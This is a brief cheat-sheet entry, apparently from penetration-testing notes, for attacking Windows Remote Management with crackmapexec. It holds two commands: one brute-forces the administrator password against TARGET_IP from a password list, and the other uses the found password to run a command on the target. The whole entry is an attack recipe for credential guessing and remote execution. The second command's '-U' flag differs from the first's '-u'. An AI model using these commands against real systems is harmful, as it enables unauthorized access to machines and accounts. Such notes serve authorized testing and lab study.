# WinRM

```bash
# Identify the password for administrator user
crackmapexec winrm TARGET_IP -u administrator -p PASS_LIST

# Run commands
crackmapexec winrm TARGET_IP -U administrator -p IDENTIFIED_PASS -x "whoami"
```